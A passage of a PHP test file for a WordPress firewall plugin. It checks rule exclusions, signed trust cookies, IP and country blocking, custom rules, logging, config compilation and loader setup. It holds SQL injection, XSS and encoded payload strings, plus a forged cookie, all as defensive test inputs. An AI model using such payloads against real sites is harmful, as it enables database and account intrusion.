$ok( 'block' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/elsewhere/', 'get' => array( 'q' => "1' OR '1'='1" ) ) )['action'], 'firewall exclusions: the same payload on another path still blocks' );
$ok( 'sqli-003' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-json/my-plugin/v1/find', 'get' => array( 'q' => "1' OR '1'='1' AND SLEEP(5)" ) ) )['rule'], 'firewall exclusions: an excluded rule never hides a second rule in the same value' );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-admin/admin-ajax.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'html' => '<script>x</script>' ) ) )['action'], 'firewall exclusions: a category excluded on a path covers every parameter there' );

/* ---------- trust cookie ---------- */

$pfw_key  = $pfw_cfg['key'];
$pfw_good = Perdita_Firewall::trust_value( 7, time() + 600, $pfw_key );
$ok( 7 === Perdita_Firewall::verify_trust( $pfw_good, $pfw_key ), 'firewall trust: a signed cookie verifies to its user id' );
$ok( false === Perdita_Firewall::verify_trust( $pfw_good, str_repeat( 'b', 64 ) ), 'firewall trust: a cookie signed with another key fails' );
$ok( false === Perdita_Firewall::verify_trust( Perdita_Firewall::trust_value( 7, time() - 1, $pfw_key ), $pfw_key ), 'firewall trust: an expired cookie fails' );
$pfw_parts    = explode( '.', $pfw_good );
$pfw_parts[0] = '1';
$ok( false === Perdita_Firewall::verify_trust( implode( '.', $pfw_parts ), $pfw_key ), 'firewall trust: changing the user id breaks the signature' );
$pfw_parts    = explode( '.', $pfw_good );
$pfw_parts[1] = (string) ( (int) $pfw_parts[1] + 999999 );
$ok( false === Perdita_Firewall::verify_trust( implode( '.', $pfw_parts ), $pfw_key ), 'firewall trust: extending the expiry breaks the signature' );
$ok( false === Perdita_Firewall::verify_trust( '1.9999999999.' . str_repeat( '0', 64 ), $pfw_key ) && false === Perdita_Firewall::verify_trust( $pfw_good, '' ), 'firewall trust: a forged signature or an empty key fails' );
$ok( 'block' === $pfw_run( array( 'cookie' => array( Perdita_Firewall::TRUST_COOKIE => '1.9999999999.' . str_repeat( 'a', 64 ) ), 'get' => array( 'id' => "1' OR '1'='1" ) ) )['action'], 'firewall trust: the engine never trusts a cookie it can\'t verify' );

$pfw_admins = get_users( array( 'role' => 'administrator', 'number' => 1, 'fields' => 'ID' ) );
$pfw_admin  = $pfw_admins ? (int) $pfw_admins[0] : 0;
$pfw_sub    = wp_insert_user( array( 'user_login' => 'perdita_smoke_fw_sub', 'user_email' => 'perdita-smoke-fw-sub@example.com', 'user_pass' => wp_generate_password(), 'role' => 'subscriber' ) );
$pfw_cookie_before = isset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] ) ? $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] : null;
$pfw_val = Perdita_Firewall_Config::maybe_set_trust_cookie( $pfw_admin, time() + 600, 0 );
$ok( $pfw_admin > 0 && $pfw_admin === Perdita_Firewall::verify_trust( $pfw_val, Perdita_Firewall_Config::key() ), 'firewall trust: an administrator gets a cookie the engine verifies' );
$ok( '' === Perdita_Firewall_Config::maybe_set_trust_cookie( is_int( $pfw_sub ) ? $pfw_sub : 0, time() + 600, 0 ), 'firewall trust: a subscriber gets no trust cookie under edit_posts' );
Perdita_Firewall_Config::clear_trust_cookie();
$ok( ! isset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] ), 'firewall trust: logout clears the cookie' );
if ( null !== $pfw_cookie_before ) {
	$_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] = $pfw_cookie_before;
}
if ( is_int( $pfw_sub ) ) {
	wp_delete_user( $pfw_sub );
}

/* ---------- Pro sections ---------- */

$pfw_pro = Perdita_Firewall_Config::build( $pfw_settings, true );
$pfw_add = function ( $config ) {
	$config['ip_blocklist']   = array( '203.0.113.128/25', '2001:db8:bad::/48' );
	$config['ip_allowlist'][] = '203.0.113.200';
	$config['custom_rules']   = array(
		array( 'id' => 'r1', 'field' => 'header:X-Debug', 'op' => 'equals', 'value' => 'on', 'action' => 'block', 'enabled' => true ),
		array( 'id' => 'r2', 'field' => 'uri', 'op' => 'starts', 'value' => '/partner-api/', 'action' => 'allow', 'enabled' => true ),
		array( 'id' => 'r3', 'field' => 'query', 'op' => 'regex', 'value' => '^promo-[0-9]+$', 'action' => 'log', 'enabled' => true ),
		array( 'id' => 'r4', 'field' => 'ip', 'op' => 'equals', 'value' => '203.0.113.60/31', 'action' => 'block', 'enabled' => true ),
		array( 'id' => 'r5', 'field' => 'user_agent', 'op' => 'contains', 'value' => 'evilbot', 'action' => 'block', 'enabled' => false ),
	);
	$config['country']        = array( 'mode' => 'block', 'countries' => array( 'KP' ), 'scope' => 'site', 'trust_server' => false );
	$config['rate_limits']    = array( array( 'route' => 'login', 'limit' => 5, 'action' => 'block', 'block_minutes' => 10 ) );
	return $config;
};
add_filter( 'perdita_firewall_config', $pfw_add );
$pfw_pro = Perdita_Firewall_Config::build( $pfw_settings, true );
remove_filter( 'perdita_firewall_config', $pfw_add );
$ok( ! empty( $pfw_pro['blocklist']['v4'] ) && ! empty( $pfw_pro['blocklist']['v6'] ), 'firewall Pro: the compiler parses ip_blocklist from the perdita_firewall_config filter' );
$pfw_prun = function ( $req ) use ( $pfw_run, $pfw_pro ) {
	$req['config'] = $pfw_pro;
	return $pfw_run( $req );
};
$ok( 'ip-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.130' ) ) )['rule'], 'firewall Pro: a blocklisted IPv4 address blocks' );
$ok( 'ip-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '2001:db8:bad:1::1' ) ) )['rule'], 'firewall Pro: a blocklisted IPv6 range blocks' );
$ok( 'ip-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.130' ), 'cookie' => $pfw_trust ) )['rule'], 'firewall Pro: the trust cookie never skips the blocklist' );
$ok( 'allowlist' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.200' ) ) )['reason'], 'firewall Pro: the allowlist wins over the blocklist' );
$ok( 'custom-r1' === $pfw_prun( array( 'server' => array( 'HTTP_X_DEBUG' => 'ON' ) ) )['rule'], 'firewall Pro: a custom header rule blocks' );
$ok( 'custom-r2' === $pfw_prun( array( 'uri' => '/partner-api/x', 'get' => array( 'q' => "1' OR '1'='1" ) ) )['reason'], 'firewall Pro: a custom allow rule skips the built-in rules' );
$pfw_v = $pfw_prun( array( 'get' => array( 'code' => 'promo-123' ) ) );
$ok( 'allow' === $pfw_v['action'] && array( 'custom-r3' ) === $pfw_v['logged'], 'firewall Pro: a custom log rule records its id and lets the request through' );
$ok( 'custom-r4' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.61' ) ) )['rule'], 'firewall Pro: a custom ip rule takes a CIDR block' );
$ok( 'allow' === $pfw_prun( array( 'server' => array( 'HTTP_USER_AGENT' => 'evilbot' ) ) )['action'], 'firewall Pro: a disabled custom rule does nothing' );
$ok( 'country-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '173.245.48.10', 'HTTP_CF_CONNECTING_IP' => '203.0.113.9', 'HTTP_CF_IPCOUNTRY' => 'KP' ) ) )['rule'], 'firewall Pro: CF-IPCountry from a Cloudflare connection blocks a listed country' );
$ok( 'allow' === $pfw_prun( array( 'server' => array( 'HTTP_CF_IPCOUNTRY' => 'KP' ) ) )['action'], 'firewall Pro: CF-IPCountry from outside Cloudflare is ignored' );
$ok( 'allow' === $pfw_prun( array( 'server' => array( 'GEOIP_COUNTRY_CODE' => 'KP' ) ) )['action'], 'firewall Pro: a server country variable counts only when the owner says the server sets it' );
$pfw_trusting                            = $pfw_pro;
$pfw_trusting['country']['trust_server'] = true;
$ok( 'country-001' === $pfw_run( array( 'config' => $pfw_trusting, 'server' => array( 'GEOIP_COUNTRY_CODE' => 'KP' ) ) )['rule'], 'firewall Pro: GEOIP_COUNTRY_CODE counts when trust_server is on' );
$pfw_allow_mode                       = $pfw_pro;
$pfw_allow_mode['country']['mode']    = 'allow';
$pfw_allow_mode['country']['countries'] = array( 'US' );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_allow_mode ) )['action'], 'firewall Pro: an unknown country never blocks in allow mode' );
$ok( Perdita_Firewall::country_code( $pfw_cfg, array( 'REMOTE_ADDR' => '203.0.113.9' ), '203.0.113.9' ) === '' || is_file( PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall-geo.php' ), 'firewall Pro: country_code() answers empty with no source and no Geo class' );
$pfw_v = $pfw_prun( array( 'uri' => '/wp-login.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ) ) );
if ( function_exists( 'apcu_enabled' ) && apcu_enabled() ) {
	$ok( 'allow' === $pfw_v['action'], 'firewall Pro: one login POST stays under the rate limit' );
} else {
	$ok( 'allow' === $pfw_v['action'] && in_array( 'rate_limits_skipped_no_apcu', $pfw_v['notes'], true ), 'firewall Pro: without APCu the rate limits skip and the verdict says so' );
}
$pfw_empty = $pfw_cfg;
foreach ( array( 'blocklist', 'custom_rules', 'country', 'rate_limits' ) as $pfw_sec ) {
	unset( $pfw_empty[ $pfw_sec ] );
}
$pfw_v = $pfw_run( array( 'config' => $pfw_empty, 'uri' => '/wp-login.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ) ) );
$ok( 'allow' === $pfw_v['action'] && array() === $pfw_v['notes'], 'firewall Pro: every Pro section is a no-op when absent' );

/* ---------- normalization and engine helpers ---------- */

$ok( "' or 1=1" === Perdita_Firewall::normalize( '%2527%20OR%201%3D1' ), 'firewall: normalize() catches double URL encoding of a quote' );
$ok( '<script>' === Perdita_Firewall::normalize( '&lt;SCRIPT&gt;' ) && 'javascript:' === Perdita_Firewall::normalize( '&#x6A;avascript&#58;' ), 'firewall: normalize() decodes named and numeric entities' );
$ok( 'sqli' === Perdita_Firewall::category_of( 'sqli-001' ) && 'php_upload' === Perdita_Firewall::category_of( 'upload-002' ) && 'probes' === Perdita_Firewall::category_of( 'probe-001' ), 'firewall: rule ids map to their categories' );
$pfw_ids = array();
foreach ( Perdita_Firewall::rules() as $pfw_cat => $pfw_list ) {
	foreach ( $pfw_list as $pfw_id => $pfw_pattern ) {
		$pfw_ids[] = $pfw_id;
		$ok( false !== @preg_match( '~' . $pfw_pattern . '~s', '' ), 'firewall: rule ' . $pfw_id . ' compiles' ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged -- the assertion is the error check.
	}
}
$ok( count( $pfw_ids ) === count( array_unique( $pfw_ids ) ), 'firewall: every rule id is unique' );
$pfw_big = $pfw_run( array( 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'a' => str_repeat( 'x ', 150000 ), 'b' => "1' OR '1'='1" ) ) );
$ok( in_array( 'inspection_truncated', $pfw_big['notes'], true ), 'firewall: a body over the inspection cap notes inspection_truncated' );

/* ---------- log ---------- */

$pfw_logcfg            = $pfw_cfg;
$pfw_logcfg['log_dir'] = Perdita_Firewall_Config::log_dir();
wp_mkdir_p( $pfw_logcfg['log_dir'] );
$pfw_v   = $pfw_run( array( 'uri' => '/wp-json/x/v1/search?q=1', 'get' => array( 'q' => "1' OR '1'='1" ) ) );
$pfw_ref = Perdita_Firewall::log( $pfw_logcfg, $pfw_v, $pfw_server( '/wp-json/x/v1/search?q=1' ) );
$pfw_logfile = $pfw_logcfg['log_dir'] . gmdate( 'Y-m-d' ) . '.log.php';
$ok( '' !== $pfw_ref && 0 === strpos( (string) file_get_contents( $pfw_logfile ), "<?php exit; ?>\n" ), 'firewall log: a match writes today\'s file, which starts with an exit line' );
file_put_contents( $pfw_logcfg['log_dir'] . gmdate( 'Y-m-d', time() - 20 * DAY_IN_SECONDS ) . '.log.php', "<?php exit; ?>\n{}\n" );
unlink( $pfw_logfile );
$pfw_ref = Perdita_Firewall::log( $pfw_logcfg, $pfw_v, $pfw_server( '/wp-json/x/v1/search?q=1' ) );
$ok( 1 === count( glob( $pfw_logcfg['log_dir'] . '*.log.php' ) ), 'firewall log: a new day\'s file prunes files older than 14 days' );
$pfw_recent = Perdita_Firewall_Config::recent( 10 );
$ok( isset( $pfw_recent[0]['ref'] ) && $pfw_ref === $pfw_recent[0]['ref'] && 'sqli-005' === $pfw_recent[0]['rule'], 'firewall log: recent() reads the newest entry back' );
$pfw_exw = Perdita_Firewall_Config::exclusion_for_entry( $pfw_recent[0] );
$ok( array( 'rule' => 'sqli-005', 'path' => '/wp-json/x/v1/search', 'param' => 'q' ) === $pfw_exw, 'firewall log: the Allow button writes the rule id, the request path, and the parameter' );
$ok( null === Perdita_Firewall_Config::exclusion_for_entry( array( 'rule' => 'ip-001', 'uri' => '/' ) ), 'firewall log: an IP block offers no Allow button' );

/* ---------- admin section ---------- */

$ok( array() === Perdita_Security_Firewall_Admin::sanitize( array( 'firewall' => '1' ) ), 'firewall admin: sanitize() returns nothing when the form had no firewall section' );
$pfw_clean = Perdita_Security_Firewall_Admin::sanitize(
	array(
		'perdita_fw_section' => '1',
		'firewall'           => '1',
		'firewall_mode'      => 'block',
		'firewall_load'      => 'evil',
		'fw_rules'           => array( 'sqli' => '1', 'xss' => '1', 'bogus' => '1' ),
		'fw_trust_roles'     => 'read',
		'fw_exclusions_text' => "sqli-005 | /wp-json/my-plugin/ | q\nxss | /Wp-Admin/<x>\nnot a rule!\n",
	)
);
$ok( true === $pfw_clean['firewall'] && 'block' === $pfw_clean['firewall_mode'] && 'plugin' === $pfw_clean['firewall_load'], 'firewall admin: sanitize() keeps a valid mode and resets an unknown loader to plugin' );
$ok( array( 'sqli', 'xss', 'traversal', 'rfi', 'php_upload', 'bad_bots', 'probes', 'xmlrpc' ) === array_keys( $pfw_clean['fw_rules'] ) && true === $pfw_clean['fw_rules']['sqli'] && false === $pfw_clean['fw_rules']['rfi'], 'firewall admin: sanitize() keeps the eight categories and drops unknown ones' );
$ok( 'edit_posts' === $pfw_clean['fw_trust_roles'], 'firewall admin: an unlisted trust capability falls back to edit_posts' );
$ok(
	array(
		array( 'rule' => 'sqli-005', 'path' => '/wp-json/my-plugin/', 'param' => 'q' ),
		array( 'rule' => 'xss', 'path' => '/wp-admin/x', 'param' => '' ),
	) === $pfw_clean['fw_exclusions'],
	'firewall admin: sanitize() parses exclusion lines and drops a bad rule name'
);
ob_start();
Perdita_Security_Firewall_Admin::render_section( array_merge( $pfw_settings, array( 'fw_exclusions' => $pfw_clean['fw_exclusions'] ) ) );
$pfw_html = (string) ob_get_clean();
$ok( false !== strpos( $pfw_html, 'name="perdita_fw_section"' ) && false !== strpos( $pfw_html, 'name="fw_rules[php_upload]"' ) && false !== strpos( $pfw_html, 'sqli-005 | /wp-json/my-plugin/ | q' ), 'firewall admin: render_section() prints the fields and the exclusion lines' );
$ok( false !== strpos( $pfw_html, 'action=perdita_firewall_allow' ) && false !== strpos( $pfw_html, '_wpnonce=' ), 'firewall admin: each log row gets a nonced Allow link' );
$ok( ! preg_match( '/\x{2014}|;\s*(?:you|the|it)\b/u', wp_strip_all_tags( $pfw_html ) ), 'firewall admin: the section copy has no em dash' );

/* ---------- compile ---------- */

$pfw_module_on = function ( $value ) {
	$value                       = is_array( $value ) ? $value : array();
	$value['modules']['security'] = true;
	return $value;
};
add_filter( 'option_perdita_core', $pfw_module_on );
$pfw_saved = array_merge( is_array( $pfw_orig['perdita_security_settings'] ) ? $pfw_orig['perdita_security_settings'] : array(), $pfw_settings, array( 'firewall_load' => 'plugin' ) );
update_option( 'perdita_security_settings', $pfw_saved );
$pfw_cfg_path = Perdita_Firewall_Config::config_path();
$ok( is_file( $pfw_cfg_path ), 'firewall compile: saving the settings writes config.php' );
$pfw_loaded = is_file( $pfw_cfg_path ) ? include $pfw_cfg_path : null;
$ok( is_array( $pfw_loaded ) && ! empty( $pfw_loaded['enabled'] ) && $pfw_loaded['key'] === Perdita_Firewall_Config::key() && ! empty( $pfw_loaded['allowlist']['v4'] ), 'firewall compile: config.php returns the array with the key and the parsed allowlist' );
$ok( is_file( Perdita_Firewall_Config::dir() . '.htaccess' ) && is_file( Perdita_Firewall_Config::dir() . 'index.php' ) && is_file( Perdita_Firewall_Config::log_dir() . 'web.config' ), 'firewall compile: the folder and its log folder carry deny guards' );
$ok( is_file( Perdita_Firewall_Config::bootstrap_path() ), 'firewall compile: the bootstrap sits beside the folder, not in it' );
$ok( 'plugin' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'], 'firewall compile: plugin mode writes no loader file' );
$ok( ! glob( Perdita_Firewall_Config::dir() . '.*.tmp' ), 'firewall compile: the atomic write leaves no temp file' );

// mu mode.
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'mu' ) ) );
$pfw_mu = Perdita_Firewall_Loader::mu_path();
$ok( is_file( $pfw_mu ) && false !== strpos( (string) file_get_contents( $pfw_mu ), Perdita_Firewall_Config::bootstrap_path() ), 'firewall mu: switching to mu writes 0-perdita-firewall.php, which includes the bootstrap' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'plugin' ) ) );
$ok( ! is_file( $pfw_mu ), 'firewall mu: switching back removes the must-use plugin' );
file_put_contents( $pfw_mu, "<?php\n// Someone else's mu-plugin.\n" );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'mu' ) ) );
$ok( "<?php\n// Someone else's mu-plugin.\n" === file_get_contents( $pfw_mu ) && 'mu_foreign' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'], 'firewall mu: another plugin\'s file of that name stays untouched' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'plugin' ) ) );
$ok( is_file( $pfw_mu ), 'firewall mu: switching back never deletes another plugin\'s file' );
unlink( $pfw_mu );

// prepend through .user.ini (FPM).
$pfw_sapi = 'fpm-fcgi';
$pfw_sapi_cb = function () use ( &$pfw_sapi ) {
	return $pfw_sapi;
};
add_filter( 'perdita_firewall_sapi', $pfw_sapi_cb );
$pfw_ini      = $pfw_tmp . 'root/.user.ini';
$pfw_ini_orig = "; host settings\nmemory_limit = 256M\nupload_max_filesize = 64M\n";
file_put_contents( $pfw_ini, $pfw_ini_orig );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'prepend' ) ) );
$pfw_state = get_option( Perdita_Firewall_Config::STATE_OPTION );
$pfw_text  = (string) file_get_contents( $pfw_ini );
$ok( 'prepend_installed' === $pfw_state['result'] && 0 === strpos( $pfw_text, $pfw_ini_orig ) && false !== strpos( $pfw_text, "auto_prepend_file = '" . Perdita_Firewall_Config::bootstrap_path() . "'" ), 'firewall prepend: FPM gets a marked auto_prepend_file block in .user.ini after the host\'s lines' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'prepend', 'firewall_mode' => 'monitor' ) ) );
$ok( 'prepend_current' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && $pfw_text === file_get_contents( $pfw_ini ), 'firewall prepend: a second save leaves the block as it is' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'plugin' ) ) );
$ok( $pfw_ini_orig === file_get_contents( $pfw_ini ), 'firewall prepend: switching back removes exactly the marked block, byte for byte' );
$ok( Perdita_Firewall_Loader::bootstrap_still_needed(), 'firewall prepend: after a .user.ini removal the bootstrap stays until PHP rereads the file' );

file_put_contents( $pfw_ini, $pfw_ini_orig . "auto_prepend_file = '/var/www/html/wordfence-waf.php'\n" );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'prepend' ) ) );
$pfw_state = get_option( Perdita_Firewall_Config::STATE_OPTION );
$ok( 'prepend_foreign' === $pfw_state['result'] && 'wordfence-waf.php' === $pfw_state['detail'] && $pfw_ini_orig . "auto_prepend_file = '/var/www/html/wordfence-waf.php'\n" === file_get_contents( $pfw_ini ), 'firewall prepend: Wordfence\'s auto_prepend_file stops the write and the screen names it' );
unlink( $pfw_ini );

// prepend through .htaccess (mod_php).
$pfw_sapi     = 'apache2handler';
$pfw_ht       = $pfw_tmp . 'root/.htaccess';
$pfw_ht_orig  = "# BEGIN WordPress\n<IfModule mod_rewrite.c>\nRewriteEngine On\n</IfModule>\n# END WordPress\n";
file_put_contents( $pfw_ht, $pfw_ht_orig );
Perdita_Firewall_Config::compile(); // The stored settings didn't change, so no update hook fires.
$pfw_text = (string) file_get_contents( $pfw_ht );
$ok( 'prepend_installed' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && false !== strpos( $pfw_text, '<IfModule mod_php.c>' ) && false !== strpos( $pfw_text, "php_value auto_prepend_file '" . Perdita_Firewall_Config::bootstrap_path() . "'" ) && false !== strpos( $pfw_text, '<IfModule LiteSpeed>' ), 'firewall prepend: mod_php gets a php_value block in .htaccess, wrapped per module' );
$pfw_state = Perdita_Firewall_Loader::status();
$ok( false === $pfw_state['working'] && '' !== $pfw_state['message'], 'firewall prepend: the status waits for PERDITA_FIREWALL_EARLY before it reports the loader as working' );
Perdita_Firewall_Config::on_deactivate();
$ok( $pfw_ht_orig === file_get_contents( $pfw_ht ), 'firewall: Core deactivation removes the .htaccess block byte for byte' );
$ok( ! is_file( $pfw_cfg_path ), 'firewall: Core deactivation removes config.php, so no loader can run the engine' );
$pfw_sapi = 'cli-server';
Perdita_Firewall_Config::compile();
$ok( 'prepend_unsupported' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && $pfw_ht_orig === file_get_contents( $pfw_ht ), 'firewall prepend: an unsupported SAPI writes nothing and says why' );
$pfw_sapi = 'apache2handler';
Perdita_Firewall_Config::compile_quiet();
$ok( 'prepend_needs_save' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && $pfw_ht_orig === file_get_contents( $pfw_ht ), 'firewall prepend: activation never adds server config without an owner save' );
unlink( $pfw_ht );
remove_filter( 'perdita_firewall_sapi', $pfw_sapi_cb );

// Off.
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall' => false ) ) );
$ok( ! is_file( $pfw_cfg_path ) && false === get_option( Perdita_Firewall_Config::STATE_OPTION, false ), 'firewall compile: turning the firewall off removes config.php and the loader state' );
$pfw_key_before = get_option( Perdita_Firewall_Config::KEY_OPTION, false );
delete_option( Perdita_Firewall_Config::KEY_OPTION );
Perdita_Firewall_Config::compile();
$ok( false === get_option( Perdita_Firewall_Config::KEY_OPTION, false ), 'firewall compile: an off compile creates no key, so other saves leave no rows behind' );
if ( false !== $pfw_key_before ) {
	update_option( Perdita_Firewall_Config::KEY_OPTION, $pfw_key_before, true );
}
update_option( 'perdita_security_settings', $pfw_saved );
remove_filter( 'option_perdita_core', $pfw_module_on );
$pfw_core_off = function ( $value ) {
	$value                        = is_array( $value ) ? $value : array();
	$value['modules']['security'] = false;
	return $value;
};
add_filter( 'option_perdita_core', $pfw_core_off );
Perdita_Firewall_Config::compile();
$ok( ! is_file( $pfw_cfg_path ), 'firewall compile: the security module off removes config.php' );
remove_filter( 'option_perdita_core', $pfw_core_off );

/* ---------- bootstrap in a child PHP process ---------- */

$pfw_php = defined( 'PHP_BINARY' ) && is_executable( PHP_BINARY ) && 'cli' === PHP_SAPI ? PHP_BINARY : '';
if ( '' !== $pfw_php && function_exists( 'shell_exec' ) ) {
	add_filter( 'option_perdita_core', $pfw_module_on );
	Perdita_Firewall_Config::compile();
	remove_filter( 'option_perdita_core', $pfw_module_on );
	$pfw_wpc   = $pfw_tmp . 'wp-config.php';
	file_put_contents( $pfw_wpc, "<?php\ndefine( 'DB_NAME', 'x' );\n" );
	$pfw_boot  = str_replace( var_export( ABSPATH . 'wp-config.php', true ), var_export( $pfw_wpc, true ), Perdita_Firewall_Config::bootstrap_source() ); // phpcs:ignore WordPress.PHP.DevelopmentFunctions.error_log_var_export -- matches the literal.
	$pfw_boot  = preg_replace( '/, -?\d+ \);\s*$/', ', 1 );' . "\n", $pfw_boot );
	file_put_contents( Perdita_Firewall_Config::bootstrap_path(), $pfw_boot );
	$pfw_script = $pfw_tmp . 'page.php';
	file_put_contents( $pfw_script, "<?php echo 'page:', defined( 'PERDITA_FIREWALL_LOADED' ) ? PERDITA_FIREWALL_LOADED : 'none', ':', defined( 'PERDITA_FIREWALL_EARLY' ) ? 'early' : 'late';\n" );
	$pfw_cmd = function () use ( $pfw_php, $pfw_script ) {
		return (string) shell_exec( escapeshellarg( $pfw_php ) . ' -n -d auto_prepend_file=' . escapeshellarg( Perdita_Firewall_Config::bootstrap_path() ) . ' ' . escapeshellarg( $pfw_script ) . ' 2>&1' ); // phpcs:ignore WordPress.WP.AlternativeFunctions.shell_exec_shell_exec -- the only way to run a prepend file in a test.
	};
	$pfw_out = trim( $pfw_cmd() );
	$ok( 'page:prepend:early' === $pfw_out, 'firewall bootstrap: as auto_prepend_file it loads the engine before anything else' . ( 'page:prepend:early' === $pfw_out ? '' : ' (got ' . substr( $pfw_out, 0, 300 ) . ')' ) );
	file_put_contents( $pfw_wpc, "<?php\ndefine( 'DB_NAME', 'x' );\ndefine( 'PERDITA_FIREWALL_DISABLE', true );\n" );
	touch( $pfw_wpc, time() + 5 );
	clearstatcache();
	$ok( 'page:none:early' === trim( $pfw_cmd() ), 'firewall bootstrap: PERDITA_FIREWALL_DISABLE in wp-config.php turns the prepend loader off' );
	file_put_contents( $pfw_wpc, "<?php\ndefine( 'DB_NAME', 'x' );\n" );
	$pfw_cfg_bak = (string) file_get_contents( $pfw_cfg_path );
	unlink( $pfw_cfg_path );
	$ok( 'page:none:early' === trim( $pfw_cmd() ), 'firewall bootstrap: with config.php gone the page loads and the engine stays out' );
	file_put_contents( $pfw_cfg_path, $pfw_cfg_bak );
	file_put_contents( Perdita_Firewall_Config::bootstrap_path(), str_replace( var_export( Perdita_Firewall_Config::engine_path(), true ), var_export( $pfw_tmp . 'missing-engine.php', true ), $pfw_boot ) ); // phpcs:ignore WordPress.PHP.DevelopmentFunctions.error_log_var_export -- matches the literal.
	$ok( 'page:none:early' === trim( $pfw_cmd() ), 'firewall bootstrap: with the plugin folder deleted the page loads with no fatal error' );
} else {
	echo "SKIP  firewall bootstrap child process (no CLI PHP binary)\n";
}

/* ---------- uninstall ---------- */

Perdita_Firewall_Config::uninstall();
$ok( ! is_dir( Perdita_Firewall_Config::dir() ), 'firewall uninstall: removes the firewall folder, its log, and its guards' );
$ok( false === get_option( Perdita_Firewall_Config::KEY_OPTION, false ) && false === get_option( Perdita_Firewall_Config::STATE_OPTION, false ), 'firewall uninstall: deletes the key and the loader state options' );

/* ---------- restore ---------- */

foreach ( $pfw_orig as $pfw_name => $pfw_value ) {
	if ( '__pfw_absent__' === $pfw_value ) {
		delete_option( $pfw_name );
	} else {
		update_option( $pfw_name, $pfw_value );
	}
}
// The settings restore recompiles, which may create the key and the state
// again, so those two go back once more.
foreach ( array( Perdita_Firewall_Config::KEY_OPTION, Perdita_Firewall_Config::STATE_OPTION ) as $pfw_name ) {
	if ( '__pfw_absent__' === $pfw_orig[ $pfw_name ] ) {
		delete_option( $pfw_name );
	} else {
		update_option( $pfw_name, $pfw_orig[ $pfw_name ] );
	}
}
foreach ( $pfw_filters as $pfw_hook => $pfw_cb ) {
	remove_filter( $pfw_hook, $pfw_cb );
}
if ( null === $pfw_uploads_orig ) {
	if ( is_file( $pfw_uploads_ht ) ) {
		unlink( $pfw_uploads_ht );
	}
} elseif ( ! is_file( $pfw_uploads_ht ) || file_get_contents( $pfw_uploads_ht ) !== $pfw_uploads_orig ) {
	file_put_contents( $pfw_uploads_ht, $pfw_uploads_orig );
}
if ( $pfw_cron_next && ! wp_next_scheduled( $pfw_cron_hook ) ) {
	wp_schedule_event( $pfw_cron_next, 'daily', $pfw_cron_hook );
}
$pfw_rm = function ( $dir ) use ( &$pfw_rm ) {
	foreach ( (array) glob( rtrim( $dir, '/' ) . '/{,.}[!.,!..]*', GLOB_BRACE ) as $pfw_f ) {
		is_dir( $pfw_f ) ? $pfw_rm( $pfw_f ) : unlink( $pfw_f );
	}
	@rmdir( $dir ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged -- test cleanup.
};
$pfw_rm( $pfw_tmp );
$ok( ! is_dir( $pfw_tmp ), 'firewall: the test removes its temp folder' );
foreach ( $pfw_opt_names as $pfw_name ) {
	$pfw_now = get_option( $pfw_name, '__pfw_absent__' );
	$ok( $pfw_now === $pfw_orig[ $pfw_name ], 'firewall: option ' . $pfw_name . ' is back to its stored value' );
}
$ok( is_file( WP_CONTENT_DIR . '/perdita-firewall/config.php' ) === $pfw_live_config && is_file( WP_CONTENT_DIR . '/mu-plugins/0-perdita-firewall.php' ) === $pfw_live_mu, 'firewall: the live config and mu-plugin are as they were' );
$ok( ( is_file( $pfw_uploads_ht ) ? (string) file_get_contents( $pfw_uploads_ht ) : null ) === $pfw_uploads_orig, 'firewall: the uploads .htaccess is back byte for byte' );
